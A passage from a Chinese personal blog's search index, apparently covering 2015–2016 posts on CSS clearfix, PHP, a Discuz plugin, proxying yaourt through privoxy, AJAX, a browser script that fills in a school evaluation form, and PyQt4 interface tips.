的浮动功能但是浮动一直以来都有一个很麻烦的问题，就是元素一旦浮动就会脱离文档流这是它的缺点，也是它的优点，为什么这么说呢？它的缺点就缺在于在排版时会增加排版的难度有时候需要父元素始终包裹住子元素，但是 float 脱离文档流之后父元素就不能直接包裹住子元素了就像这样 相比 display: inline-block 它却有一个好处， 用过 inline-block 的都知道，行内块元素属于文档内节点，不脱离文档流但是随之而来的，不脱离文档流的的情况下就很容易发生这种问题 就是一旦代码中存在换行，制表符，这些东西的话，就会被当成空白节点处理，两个元素之间总会有一个莫名其妙的间距而 float 出来的元素就可以不用考虑空白符节点的问题所以我还是选择了 float，那么接下来要解决的问题就是怎么让父元素包裹住 float 的元素了现在最主流的办法就是使用 css 的 clearfix 类，就是在父元素标签的 class 属性中添加 clearfix，类似这样1&lt;div class=\"clearfix\"&gt;&lt;/div&gt; 然后 clearfix 的写法有好多种，这里记三种常用一点的，都可以兼容 IE6 的 第一种：overflow:auto1234.clearfix &#123; overflow: auto; zoom: 1;&#125; 第二种：使用 after 伪元素1234567.clearfix:after &#123; content:\"\\200B\"; display:block; height:0; clear:both; &#125; .clearfix &#123;*zoom:1;&#125;/*IE/7/6*/ 第三种：display:table 与 clear:both 联用12345678.clearfix:before,.clearfix:after&#123; content:\"\"; display:table; &#125; .clearfix:after&#123;clear:both;&#125; .clearfix&#123; *zoom:1;/*IE/7/6*/&#125; 这样子就可以实现让父元素包裹住浮动的子元素了 参考资料： 解读浮动闭合最佳方案：clearfixCSS - 清除浮动（clearfix hack）What methods of ‘clearfix’ can I use?clearfix 清除浮动进化史","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[]},{"title":"关于 PHP 中带减号的变量的处理方法","slug":"150","date":"2016-02-14T00:28:00.000Z","updated":"2018-06-08T09:41:35.000Z","comments":true,"path":"archives/deal-with-the-varible-which-contains-minus-in-php.html","link":"","permalink":"https://hexo.bangz.me/archives/deal-with-the-varible-which-contains-minus-in-php.html","excerpt":"最近在研究 Challonge 的 API在输出 tournaments 表的时候，看到了一个很奇怪的东西12$tournamentsList = $api_instance[$key]-&gt;getTournaments()-&gt;tournament;print_r($tournamentsList); 输出结果如下123456789101112131415161718SimpleXMLElement Object( [id] =&gt; 2213854 [name] =&gt; DFXRC first match [url] =&gt; DFXRC_first_match [description] =&gt; &lt;strong&gt;DFXRC&lt;/strong&gt; is strong! [tournament-type] =&gt; single elimination [started-at] =&gt; 2016-02-04T00:05:26-08:00 [completed-at] =&gt; SimpleXMLElement Object ( [@attributes] =&gt; Array ( [type] =&gt; dateTime [nil] =&gt; true ) )..... 看到那个 started-at 了没？没错！你没看错，变量名里面居然有减号！！！","text":"最近在研究 Challonge 的 API在输出 tournaments 表的时候，看到了一个很奇怪的东西12$tournamentsList = $api_instance[$key]-&gt;getTournaments()-&gt;tournament;print_r($tournamentsList); 输出结果如下123456789101112131415161718SimpleXMLElement Object( [id] =&gt; 2213854 [name] =&gt; DFXRC first match [url] =&gt; DFXRC_first_match [description] =&gt; &lt;strong&gt;DFXRC&lt;/strong&gt; is strong! [tournament-type] =&gt; single elimination [started-at] =&gt; 2016-02-04T00:05:26-08:00 [completed-at] =&gt; SimpleXMLElement Object ( [@attributes] =&gt; Array ( [type] =&gt; dateTime [nil] =&gt; true ) )..... 看到那个 started-at 了没？没错！你没看错，变量名里面居然有减号！！！ 按照 PHP 变量名的命名规范来说，这种变量名简直就是犯规啊！这要怎么访问？？按照常理来说，应该用1echo $tournamentsList-&gt;started-at 这样直接访问的，可是很明显，减号会被识别成运算符这样语义就变成了变量 start 减变量 at 了不出所料，打开页面返回 HTTP 500= =想了想，加引号试试1echo $tournamentsList-&gt;\"started-at\" 结果还是不行，直接语法错误真是逼死人，直接再定义一个变量！12$word=\"started-at\";echo $tournamentsList-&gt;$word; 这样居然成功了！！天哪，访问个变量居然要定义两个变量，怎么这么麻烦！正准备去给他们报个 issue，结果看到前面已经有人提出来了他们官方给出的访问方法居然是这样的．．．1echo (string)$tournament-&gt;&#123;'tournament-type'&#125;; 真是长见识了，加花括号再加引号的访问变量 = =，厉害厉害，佩服啊!","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://hexo.bangz.me/tags/PHP/"}]},{"title":"初次写 discuz X 插件的一些感受","slug":"148","date":"2016-02-03T20:57:00.000Z","updated":"2018-06-08T09:40:37.000Z","comments":true,"path":"archives/some-feeling-after-first-writed-discuz-plugin.html","link":"","permalink":"https://hexo.bangz.me/archives/some-feeling-after-first-writed-discuz-plugin.html","excerpt":"某社区打算升级 discuzX3.2，不过据说原来的录像解析插件升级了之后不能用了于是我自发的去帮了一下他们，顺便看看他们的解析是什么样子 本来以为他们的录像解析是以插件的形式嵌入论坛的直到我开始分析他们的源码．．．．．．","text":"某社区打算升级 discuzX3.2，不过据说原来的录像解析插件升级了之后不能用了于是我自发的去帮了一下他们，顺便看看他们的解析是什么样子 本来以为他们的录像解析是以插件的形式嵌入论坛的直到我开始分析他们的源码．．．．．． 我去，居然直接改 discuz 的源码！而且没有任何的修改说明，代码东一块西一块零零散散的，光是找相关代码都要找半天，真是无语了 = = 于是我打算把原来在 X2 中的修改源码的形式改成在 X3.2 中的插件形式上手照着 google 那些入门教程写了写，然后了解了一下里面插件的嵌入方式弄着弄着，渐渐地开始体会到了 discuz 这整个架构的庞大与沉重．．．这时我仿佛看到了当年的 ENIAC（世界上第一台计算机）．．．TMD 论重量级，跟 Typecho 简直一个天上一个地下啊！！！Typecho 数据库的所有表加起来才 8 张而 discuzX2 的数据库表加起来却超过 200 张，升级到 X3.2 后更是超过了 300 张！我的天．．． 再说说弄这个录像解析插件的曲折之路吧．刚开始，根据 discuz 的资料库，看到了 viewthread_attach_extra 这个注入点这个函数应该返回一个 array，在 discuzcode.htm但问题来了，这个返回的 array 中应该是什么格式？包含什么样的内容？文档里面完全没有相关资料，在网上搜更是有人直接 return array(1, 2, 3) 的 = =于是我打开 discuzcode.htm，到里面去找答案，原来是要返回一个 aid 附件表可是我完全不知道怎么获得这个 aid 表．．．于是纳闷了，搞半天，最后只好放弃了这个方案，换种思路接着试了 discuzcode，然而还是附件信息不足，无法解析成功 既然找来找去，没有好的 hook 点，也就只好被逼着改点源码．造一个 hook 点了可是 DZ 这么大的架构，要怎么驾驭？？？试过 echo，var_dump，啥效果都没有．．．这可怎么调试．．．于是去网上搜各种办法，才知道每次修改 php 之后都要清缓存才行而且发现了两个很重要的函数12showmessage(\"要输出的消息\");debug($ 变量); 这样终于可以调试了，于是修改了 function_attachment.php，在里面遍历附件并显示的地方嵌入代码这下一改，一下子就解决了附件信息不足的问题．而且可以做到尽可能少的改 DZ 源代码 最终决定．整个插件的思路是这样的 先写一个插件包，把原来 X2 中旧的录像解析，里面跟 DZ 黏在一起的部分的代码分离出来然后写一个 replay_tool.class.php，作为一个嵌入的标志，全局性的把录像解析的 css 样式放到 viewthread 页面的顶部在 DZ 的 admin 后台引用这个 replay_tool.class.php然后在 function_attachment.php 的显示附件部分，嵌入自己的代码通过全局变量 $_G 判断插件是否已经启用1in_array('replay_tool', $_G['setting']['plugins']['available']) 如果已经启用的话，就开始引入 source/plugin/replay_tool/core.func.php，并执行里面的 resolve_replay() 函数这样就实现了论坛附件录像解析的功能， 最后感叹一下，大的架构真的是不一样啊．虽然 discuzX3.2 不是什么新东西了．但里面的架构思想还真是让人印象深刻． 源码已上传至 Github","categories":[{"name":"项目开发","slug":"项目开发","permalink":"https://hexo.bangz.me/categories/项目开发/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://hexo.bangz.me/tags/PHP/"},{"name":"Discuz","slug":"Discuz","permalink":"https://hexo.bangz.me/tags/Discuz/"}]},{"title":"Manjaro 下设置 yaourt 走 ss 代理","slug":"141","date":"2016-01-25T02:24:00.000Z","updated":"2018-06-08T07:07:53.000Z","comments":true,"path":"archives/configure-yaourt-proxy-in-manjaro.html","link":"","permalink":"https://hexo.bangz.me/archives/configure-yaourt-proxy-in-manjaro.html","excerpt":"Arch 系的 linux 还真不好折腾 AUR 上的软件包有些都被 wall 了 只好自己摸索办法，让 yaourt 去走代理 看了 archwiki 知道了 yaourt 是默认支持 http_proxy 和 https_proxy 的 于是想到了借助 privoxy 来转发数据流给 ss 的办法","text":"Arch 系的 linux 还真不好折腾 AUR 上的软件包有些都被 wall 了 只好自己摸索办法，让 yaourt 去走代理 看了 archwiki 知道了 yaourt 是默认支持 http_proxy 和 https_proxy 的 于是想到了借助 privoxy 来转发数据流给 ss 的办法 记录下 privoxy 的配置过程 首先安装 privoxy1sudo pacman -S privoxy 配置 config 文件1sudo kwrite /etc/privoxy/config 直接在最顶上新建一行，写上 ss 的本地代理地址1forward-socks5 / 127.0.0.1:1288 . 然后保存退出，并启动 privoxy 服务1sudo systemctl start privoxy.service privoxy 的默认监听端口是 8118（可以在刚在的配置文件里面改 listen-address），所以直接配置 http_proxy 和 https_proxy 即可12export https_proxy=127.0.0.1:8118export http_proxy=127.0.0.1:8118","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://hexo.bangz.me/tags/Linux基础/"},{"name":"Shadowsocks","slug":"Shadowsocks","permalink":"https://hexo.bangz.me/tags/Shadowsocks/"}]},{"title":"利用 ajax 制作简单的边栏日历插件","slug":"128","date":"2016-01-12T05:18:00.000Z","updated":"2018-06-08T09:40:03.000Z","comments":true,"path":"archives/using-ajax-to-make-calendar-plugin.html","link":"","permalink":"https://hexo.bangz.me/archives/using-ajax-to-make-calendar-plugin.html","excerpt":"这回写了个 Typecho 边栏日历插件，这是本人第一次写博客插件 链接：https://github.com/istobran/typecho-calender-plugin 在做这个插件的时候，由于是第一次上手玩 Typecho 插件，遇到了很多很多的问题 先是一点一点的去分析别人写的插件，搞清楚了 plugin.php 的工作机制，再根据分析结果把自己的代码注入进去 还好自己还有一点这方面的功底，分析过程还算顺利，接着自己写的日历的 HTML 结构和 CSS 样式很快就搞定了 在实现日历翻页功能的时候，本来可以用纯 javascript 去实现的，但是想了想，还是试一下 ajax 吧 于是就开始着手研究自己从来没接触过的 ajax，下面就开始记录一下自己的学习成果","text":"这回写了个 Typecho 边栏日历插件，这是本人第一次写博客插件 链接：https://github.com/istobran/typecho-calender-plugin 在做这个插件的时候，由于是第一次上手玩 Typecho 插件，遇到了很多很多的问题 先是一点一点的去分析别人写的插件，搞清楚了 plugin.php 的工作机制，再根据分析结果把自己的代码注入进去 还好自己还有一点这方面的功底，分析过程还算顺利，接着自己写的日历的 HTML 结构和 CSS 样式很快就搞定了 在实现日历翻页功能的时候，本来可以用纯 javascript 去实现的，但是想了想，还是试一下 ajax 吧 于是就开始着手研究自己从来没接触过的 ajax，下面就开始记录一下自己的学习成果 Ajax 的英文全称是 Asynchronous JavaScript and XML（参考 wiki 上的定义 https://zh.wikipedia.org/wiki/AJAX） 直译的话就是异步的 javascript 和 XML，也就是说，ajax 本身是实现异步交互的一种技术 关于异步的概念，可以参考这里：http://www.cnblogs.com/zhangjing0502/archive/2012/05/18/2507786.html 这里也说下我对异步这个概念的理解吧，异步这个概念事实上是相对于同步而言的 也就是说，异步技术是用来解决同步技术中存在的缺点的 那么同步技术中所存在的问题有哪些呢？ 事实上从业务逻辑的角度上来说是没有问题的。问题主要出现在用户体验上 比如用户注册功能，传统的同步技术使用户必须填完所有表单之后才能提交 服务器对表单处理完成后，再返回结果给用户，成功的还好说 但是如果说，这个用户名已经被占用了的话，用户需要再重新填写整个注册表单 而且用户没有办法保证提交了表单之后就不出错。 为了解决这个问题，人们设想，能不能让用户一边填的时候，一边验证呢？ 于是异步请求的技术就产生了，它使得页面能在不重新加载的前提下，与服务器进行通信。把验证结果直接反馈到当前页面上 ajax 就是这么一个技术，他从技术层面上实现了一边填写表单一边验证的过程 ajax 通过使用 javascript 发送 xml 数据给服务器，服务器再把结果返回回来，实现基于 xml 内容格式的通信 下面是一个 XML 请求的构建过程 1、实例化一个 XMLHttpRequest 对象1var request = new XMLHttpRequest(); 2、设定 url 和请求方式（以 GET 请求为例）1request.open(&quot;GET&quot;, &quot;server.php?number=&quot; + document.getElementById(&quot;keyword&quot;).value); 3、发送请求1request.send(); 4、监听请求的状态变化1234567891011request.onreadystatechange = function() &#123; if (request.readyState===4) &#123; // 表示请求完成，且响应已经就绪 if (request.status===200) &#123; // 表明请求成功，返回 HTTP 状态码 200 document.getElementById(\"searchResult\").innerHTML = request.responseText; &#125; else &#123; // 表明请求失败，返回了其他的状态码 alert(\"发生错误：\" + request.status); &#125; &#125; &#125; 以上就是一个完整的 ajax 请求过程，通过构建请求并监听 request 的状态变化，即可实现页面异步处理的过程 关于 readyState 的值的含义：123456readyState 存有 XMLHttpRequest 的状态。从 0 到 4 发生变化。0: 请求未初始化 1: 服务器连接已建立 2: 请求已接收 3: 请求处理中 4: 请求已完成，且响应已就绪 构建 POST 请求也只是大同小异，在构建 XMLHTTPRequest 请求的时候修改一下发送方式即可12345678var request = new XMLHttpRequest();request.open(\"POST\", \"server.php\");var data = \"name=\" + document.getElementById(\"staffName\").value + \"&amp;number=\" + document.getElementById(\"staffNumber\").value + \"&amp;sex=\" + document.getElementById(\"staffSex\").value + \"&amp;job=\" + document.getElementById(\"staffJob\").value;request.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");request.send(data); 以上就是一个较为原始的 ajax 的实现方式了，值得注意的是，POST 方式的请求必须设置 HTTP 请求头的 Content-type，否则服务器端可能无法识别 不过上面这种服务器直接返回 HTML 的做法现在已经比较少使用了 现在更加普遍的一种做法是，发送请求的时候依然使用 XML，但服务器会返回 json 数据 所以在处理响应的时候，经常会用到 json 解析函数 下面是一个处理 JSON 的例子1234567891011121314request.onreadystatechange = function() &#123; if (request.readyState===4) &#123; if (request.status===200) &#123; var data = JSON.parse(request.responseText); if (data.success) &#123; document.getElementById(\"createResult\").innerHTML = data.msg; &#125; else &#123; document.getElementById(\"createResult\").innerHTML = \"出现错误：\" + data.msg; &#125; &#125; else &#123; alert(\"发生错误：\" + request.status); &#125; &#125; &#125; 可以看到，上面使用了 JSON.parse 来处理 response 响应中的内容（要尽量避免使用 eval，因为 eval 是不安全的处理方式） 使用 JQuery 来构建 ajax 请求，直接绑定按钮的点击事件 jQuery.ajax 函数的语法（这个函数的功能最完整也最复杂）：1234567$.ajax(&#123; type: method, url: url, data: data, success: success, dataType: dataType&#125;); （参考：http://www.w3school.com.cn/jquery/ajax_ajax.asp） 简写的 get 函数语法：1$(selector).get(url,data,success(response,status,xhr),dataType) 简写的 post 函数语法：1jQuery.post(url,data,success(data, textStatus, jqXHR),dataType) 我自己的应用的例子： 123456789101112$.post(window.php_Url, &#123; year: $(\"#cal_year b\").html(), month: $(\"#cal_month b\").html(), action: direction, selected: changeVal&#125;, function(data) &#123; if (data.success) &#123; $(\"#cal_plugin tbody\").html(data.tbody); $(\"#cal_year b\").html(data.year); $(\"#cal_month b\").html(data.month); &#125;&#125;, \"json\");","categories":[{"name":"项目开发","slug":"项目开发","permalink":"https://hexo.bangz.me/categories/项目开发/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://hexo.bangz.me/tags/javascript/"},{"name":"PHP","slug":"PHP","permalink":"https://hexo.bangz.me/tags/PHP/"},{"name":"ajax","slug":"ajax","permalink":"https://hexo.bangz.me/tags/ajax/"}]},{"title":"javascript 编写正方系统评教脚本","slug":"125","date":"2016-01-02T08:19:00.000Z","updated":"2018-06-08T09:38:25.000Z","comments":true,"path":"archives/scripting-automatic-teacher-evaluation-by-javascript.html","link":"","permalink":"https://hexo.bangz.me/archives/scripting-automatic-teacher-evaluation-by-javascript.html","excerpt":"之前学校又搞起了评教，觉得每次评教都要鼠标点老半天实在是不爽，于是想着自己写个快速评教脚本，顺便练习一下久违的 javascript于是动手，用 chrome 在线调试功能来写之前只是稍微见过别人调试，没有自己深究过这玩意现在发现 chrome 的 console 还真是挺强大的一个工具直接按 F12，然后切换到 console 选项卡就可以呼出控制台于是下意识来个 “hello world”，哈哈","text":"之前学校又搞起了评教，觉得每次评教都要鼠标点老半天实在是不爽，于是想着自己写个快速评教脚本，顺便练习一下久违的 javascript于是动手，用 chrome 在线调试功能来写之前只是稍微见过别人调试，没有自己深究过这玩意现在发现 chrome 的 console 还真是挺强大的一个工具直接按 F12，然后切换到 console 选项卡就可以呼出控制台于是下意识来个 “hello world”，哈哈这个控制台其实就是一个调试 javascript 的控制台可以用它来交互式的编写 js 脚本，输入一句就执行一句直接在上面输入 alert(“xxx”)，然后回车。接着就会像之前编写 js 一样弹出 xxx 警告消息上面用到的 console 对象是 chrome 独有的一个对象。咱常用到他的 log 方法来实现在控制台记录日志，就像其他语言中的 print 函数一样的chrome 的控制台就说到这里，接下进入正题。在进入正方教务系统后，我想像之前一样用 dom 内置对象直接获取页面中的下拉菜单但却弄半天发现获取不到，于是我就奇了怪了，开始怀疑是不是有什么代码能够干扰 DOM 操作经过反复的测试，终于发现，原来那个表单是在 iframe 内的，从 iframe 那里开始就无法进一步获取到 iframe 内的对象了用 Google 查了查，才知道，原来 iframe 内的元素相当于重新多了一层 DOM 模型，用我的理解图来解释的话是这样的所以，要获取 iframe 内的元素的话，必须先获取 iframe，具体代码如下12var iframe = document.getElementById('iframeautoheight');var innerDoc = iframe.contentDocument || iframe.contentWindow.document; 接着就可以进行 DOM 操作了1var selects = innerDoc.getElementsByTagName(&apos;select&apos;); 接着只需要再筛选出 ID 中包含 “DataGrid__” 打头的元素，就能获取到所有的评分下拉列表了12345678var scorelist = [];// 找到下拉菜单列表 for (var i = 0; i &lt; selects.length; i++) &#123; if (selects[i].id.indexOf(\"DataGrid1__\") &gt; -1) &#123; scorelist.push(selects[i]); &#125;&#125; 最后，由于评教不能够所有的评分都是一致的，要选出其中一个来改一改，于是用上 random 函数随机产生一个值1var rid = Math.floor(Math.random()*scorelist.length); 把这个值设成对应的分数即可12345if (i == rid) &#123; if (tempValue == '4(良好)') &#123; ops[j].selected = true; &#125;&#125; 其实也可以参考 KK 的做法，直接设置 select 元素的 value 值。提交的时候的数据都是一样的（佩服 KK，揣摩的太透彻） 程序源码已提交至 GitHub","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"HTML5","slug":"HTML5","permalink":"https://hexo.bangz.me/tags/HTML5/"},{"name":"CSS3","slug":"CSS3","permalink":"https://hexo.bangz.me/tags/CSS3/"},{"name":"javascript","slug":"javascript","permalink":"https://hexo.bangz.me/tags/javascript/"}]},{"title":"PyQt4——自制带提示的滑动槽","slug":"116","date":"2015-12-12T23:35:00.000Z","updated":"2018-06-08T09:37:30.000Z","comments":true,"path":"archives/pyqt4-build-a-slider-bar-with-tooltip.html","link":"","permalink":"https://hexo.bangz.me/archives/pyqt4-build-a-slider-bar-with-tooltip.html","excerpt":"在写那个引擎配置器的过程中，发现 PyQt4 的滑动槽并没有那么好用 对比下 Windows 的滑动槽，我们可以很容易的发现一个问题 比如调节音量的音量柄，我们在拖动的时候，它会在旁边伴随着一个气泡提示 可是我们在 PyQt4 的滑动柄上并没有发现这个功能，拖着完全就是瞎拖，完全没有一个量的概念","text":"在写那个引擎配置器的过程中，发现 PyQt4 的滑动槽并没有那么好用 对比下 Windows 的滑动槽，我们可以很容易的发现一个问题 比如调节音量的音量柄，我们在拖动的时候，它会在旁边伴随着一个气泡提示 可是我们在 PyQt4 的滑动柄上并没有发现这个功能，拖着完全就是瞎拖，完全没有一个量的概念 通过谷歌搜索了国内外的各大论坛，好像都没有一个解决方案，自己弄弄了半天也弄不出来 于是上 StackOverflow 发了个贴问了问： http://stackoverflow.com/questions/31653647/how-to-make-a-tip-to-follow-the-handler-of-slider-with-pyqt 还真的是有大牛出来帮解决了，好评！国外的学术气氛就是不一样。 好了，下面说一下总体的方法。 一开始，我只是参考了一下网上的一些解决方案，弄来弄去，发现顶多只能做到气泡跟随鼠标来移动 也就是这个做法1QtGui.QToolTip.showText(QtGui.QCursor.pos(), str(value), self) 接着就完全不知道怎么做了，顶多只能获取到鼠标指针的坐标，无法获取到滑动柄的下标 查遍了 PyQt 官方文档的方法，还是没有结果 看了 StackOverflow 人家给的回答之后，才知道，这个必须把 QSlider 的封装给拆开才能弄 拆开封装获取到里面的长方形滑块1234style=self.slider.style()opt=QtGui.QStyleOptionSlider()self.slider.initStyleOption(opt)rectHandle=style.subControlRect(QtGui.QStyle.CC_Slider,opt, QtGui.QStyle.SC_SliderHandle,self) 这个长方形滑块是属于 QRect 类的一个对象 可以通过以下方法获取到这个滑块的右下角位置的绝对坐标1myPoint=rectHandle.bottomRight()+self.slider.pos() 也可以分别获取其中的 x,y 坐标，这个牛人还总结出了一个 magic number。。。这个其实可以看成是个固定偏移吧12345magicX=5magicY=15x=rectHandle.right()+rectHandle.width()+self.slider.pos().x()+magicXy=rectHandle.bottom()+rectHandle.height()+self.slider.pos().y()+magicY 最后，再把获得的 x, y 坐标给重新构成个 QPoint，并根据这个坐标把气泡显示出来1QtGui.QToolTip.showText(QtCore.QPoint(x,y), str(value), self)","categories":[{"name":"项目开发","slug":"项目开发","permalink":"https://hexo.bangz.me/categories/项目开发/"}],"tags":[{"name":"PYTHON","slug":"PYTHON","permalink":"https://hexo.bangz.me/tags/PYTHON/"}]},{"title":"PyQt4——实现窗口拖动","slug":"115","date":"2015-12-12T23:26:00.000Z","updated":"2018-06-08T09:37:21.000Z","comments":true,"path":"archives/pyqt4-implement-window-drag.html","link":"","permalink":"https://hexo.bangz.me/archives/pyqt4-implement-window-drag.html","excerpt":"接着前面的隐藏标题栏之后，我们可以自制关闭按钮，最大化按钮和最小化按钮，但是有一个功能可能我们没有办法很直接的实现 就是有标题栏的时候，程序可以直接通过鼠标拖动来改变位置。 现在没有标题栏了，怎么样才能实现拖动窗口来改变位置呢？ 经过查阅 PyQt 官方文档，发现 QMainWndow 是继承 QWidget 类的 http://pyqt.sourceforge.net/Docs/PyQt4/qwidget.html 而 QWidget 里面有几个默认的监听方法，譬如： mouseMoveEvent(self, QMouseEvent) mousePressEvent(self, QMouseEvent) mouseReleaseEvent(self, QMouseEvent) 那么按照面向对象的思想来说，我们只需重写这些方法，就可以达到我们需要的效果","text":"接着前面的隐藏标题栏之后，我们可以自制关闭按钮，最大化按钮和最小化按钮，但是有一个功能可能我们没有办法很直接的实现 就是有标题栏的时候，程序可以直接通过鼠标拖动来改变位置。 现在没有标题栏了，怎么样才能实现拖动窗口来改变位置呢？ 经过查阅 PyQt 官方文档，发现 QMainWndow 是继承 QWidget 类的 http://pyqt.sourceforge.net/Docs/PyQt4/qwidget.html 而 QWidget 里面有几个默认的监听方法，譬如： mouseMoveEvent(self, QMouseEvent) mousePressEvent(self, QMouseEvent) mouseReleaseEvent(self, QMouseEvent) 那么按照面向对象的思想来说，我们只需重写这些方法，就可以达到我们需要的效果 下面就通过重写 mousePressEvent 和 mouseMoveEvent 来实现窗口的拖动：1234567891011121314151617181920212223242526import sysfrom PyQt4.QtGui import *from PyQt4.Qt import *from PyQt4.QtCore import *class AboutUsDialog(QDialog): def __init__(self): super(AboutUsDialog,self).__init__() self.setWindowFlags(Qt.FramelessWindowHint|Qt.Dialog) def mousePressEvent(self, e): if e.button()==Qt.LeftButton: self.move1=e.globalPos()-self.frameGeometry().topLeft() QApplication.postEvent(self,QEvent(174)) e.accept() def mouseMoveEvent(self, e): if e.buttons()==Qt.LeftButton: self.move(e.globalPos()-self.move1) e.accept() app = QApplication(sys.argv)aboutus = AboutUsDialog()aboutus.show()sys.exit(app.exec_()) 这个方法在 QMainWindow 下也是适用的，因为 QMainWindow 和 QDialog 都是继承自 QWidget 的类","categories":[{"name":"项目开发","slug":"项目开发","permalink":"https://hexo.bangz.me/categories/项目开发/"}],"tags":[{"name":"PYTHON","slug":"PYTHON","permalink":"https://hexo.bangz.me/tags/PYTHON/"}]},{"title":"PyQt4——隐藏程序标题栏","slug":"114","date":"2015-12-12T22:44:00.000Z","updated":"2018-06-08T07:07:53.000Z","comments":true,"path":"archives/pyqt4-hide-program-titlebar.html","link":"","permalink":"https://hexo.bangz.me/archives/pyqt4-hide-program-titlebar.html","excerpt":"今天在写自己的配置器的时候，由于上了自定义的 CSS 样式风格，使得跑起程序来，感觉 windows 自带的外边框很不搭调，挺难看的","text":"今天在写自己的配置器的时候，由于上了自定义的 CSS 样式风格，使得跑起程序来，感觉 windows 自带的外边框很不搭调，挺难看的 于是想办法去掉，弄了半天，发现有一个比较好的通用的方法 1self.setWindowFlags(QtCore.Qt.FramelessWindowHint) 该方法要求此类必须是 QWidget 或者是继承自 QWidget 类的子类，可以是 QMainWindow，也可以是 QDialog。 使用前面 cpu 监视器的例子来说，可以直接写在构造方法中1234class MainUiClass(QtGui.QMainWindow, progress.Ui_MainWindow): # 多重继承 def __init__(self, parent = None): ... self.setWindowFlags(QtCore.Qt.FramelessWindowHint) # 隐藏程序标题栏，该方法继承自 QMainWindow","categories":[{"name":"项目开发","slug":"项目开发","permalink":"https://hexo.bangz.me/categories/项目开发/"}],"tags":[{"name":"PYTHON","slug":"PYTHON","permalink":"https://hexo.bangz.me/tags/PYTHON/"}]},{"title":"PyQt4——处理用户界面事件，信号槽机制","slug":"111","date":"2015-12-08T03:01:00.000Z","updated":"2018-06-08T07:24:49.000Z","comments":true,"path":"archives/pyqt4-bind-ui-event-by-signal-and-slot.html","link":"","permalink":"https://hexo.bangz.me/archives/pyqt4-bind-ui-event-by-signal-and-slot.html","excerpt":"PyQt 的信号槽机制又是它的一大特色，刚接触到这个东西，感觉真的很神奇 信号和槽这个概念本身有点像是物理学的概念，但其实对我来说并不觉得陌生 以前玩 MineCraft，也就是我的世界的时候，里面有个红石系统，其实就是玩的这个 一个开关，用红石导线连接到活塞 开关打开，就产生了红石信号，并通过红石作为导线发射到活塞，活塞收到信号之后就被推了出去 里面的红石信号就相当于这里的信号，活塞就相当于这里的槽，槽收到信号之后会触发一系列的事情 又比如说田径场上正在比赛的运动员，一听到枪声，就随声起跑 枪声就是信号，运动员的大脑就是槽，大脑接收到信号之后就开始条件反射的起跑 PyQt 通过在方法间建立信号槽机制，可以轻松的管理用户的操作，比如点击按钮，使用快捷键等","text":"PyQt 的信号槽机制又是它的一大特色，刚接触到这个东西，感觉真的很神奇 信号和槽这个概念本身有点像是物理学的概念，但其实对我来说并不觉得陌生 以前玩 MineCraft，也就是我的世界的时候，里面有个红石系统，其实就是玩的这个 一个开关，用红石导线连接到活塞 开关打开，就产生了红石信号，并通过红石作为导线发射到活塞，活塞收到信号之后就被推了出去 里面的红石信号就相当于这里的信号，活塞就相当于这里的槽，槽收到信号之后会触发一系列的事情 又比如说田径场上正在比赛的运动员，一听到枪声，就随声起跑 枪声就是信号，运动员的大脑就是槽，大脑接收到信号之后就开始条件反射的起跑 PyQt 通过在方法间建立信号槽机制，可以轻松的管理用户的操作，比如点击按钮，使用快捷键等 下面一张图简单明了地解释了信号和槽的关系 可以看到，一个信号可以连接多个槽，其实一个槽也可以接受多种信号 下面看看 PyQt 中信号槽机制的使用方法 1、直接连接方法槽，将 btn_usermgmt 按钮的点击事件连接到 switch_to_usermgmt 方法：1self.btn_usermgmt.clicked.connect(self.switch_to_usermgmt) 这样就可以实现当点击 btn_usermgmt 按钮时，调用 switch_to_usermgmt 方法 2、使用带参数的信号 先定义一个带参数的方法作为槽12def updateProgressBar(self, val): self.progressBar.setValue(val) # 更新进度条 再自定义一个信号123456789class ThreadClass(QtCore.QThread): def __init__(self, parent = None): super(ThreadClass, self).__init__(parent) def run(self): while True: val = sysInfo.getCPU() #print val self.emit(QtCore.SIGNAL(\"CPU_VALUE\"), val) # 把 val 作为附带参数，发射 CPU_VALUE 信号 接着绑定信号和槽即可1self.connect(self.threadclass, QtCore.SIGNAL(\"CPU_VALUE\"), self.updateProgressBar) # 把自己的成员方法作为槽连接到 threadclass 线程的信号 整个程序完整的代码：https://github.com/istobran/cpuUsageViewer 3、断开连接 把之前建立的连接给断开，用法跟前面的 connect 基本一样1self.btn_add.clicked.disconnect(self.ready_add_user) 参考文档： 怎样使用信号与槽？ Qt 入门之信号与槽机制 PyQt4 信号和槽详解","categories":[{"name":"项目开发","slug":"项目开发","permalink":"https://hexo.bangz.me/categories/项目开发/"}],"tags":[{"name":"PYTHON","slug":"PYTHON","permalink":"https://hexo.bangz.me/tags/PYTHON/"}]},{"title":"PyQt4——qss 样式表的使用，设计一个漂亮的界面","slug":"107","date":"2015-12-08T00:39:00.000Z","updated":"2018-06-08T07:24:49.000Z","comments":true,"path":"archives/pyqt4-design-beautiful-ui-with-qss-stylesheet.html","link":"","permalink":"https://hexo.bangz.me/archives/pyqt4-design-beautiful-ui-with-qss-stylesheet.html","excerpt":"qss 算是 Qt 一个非常重要的特色之一了 qss 全称 qt stylesheet，也就是 Qt 样式表 通过这个样式表，我们可以像开发 Web 前端的 CSS 一样，使用同样的语法对前端进行美化 在这里，咱可以先看看别人做的比较漂亮的 下面这个是我做的","text":"qss 算是 Qt 一个非常重要的特色之一了 qss 全称 qt stylesheet，也就是 Qt 样式表 通过这个样式表，我们可以像开发 Web 前端的 CSS 一样，使用同样的语法对前端进行美化 在这里，咱可以先看看别人做的比较漂亮的 下面这个是我做的 哈哈，是不是感觉很厉害的样子？ 其实学过 CSS 的话，这东西上手非常快，我也不打算在这里细说里面的样式设计方法，需要的去看官方文档吧 http://doc.qt.io/qt-4.8/stylesheet-examples.html 这里只说明一下 qss 怎么样生效 在 CSS 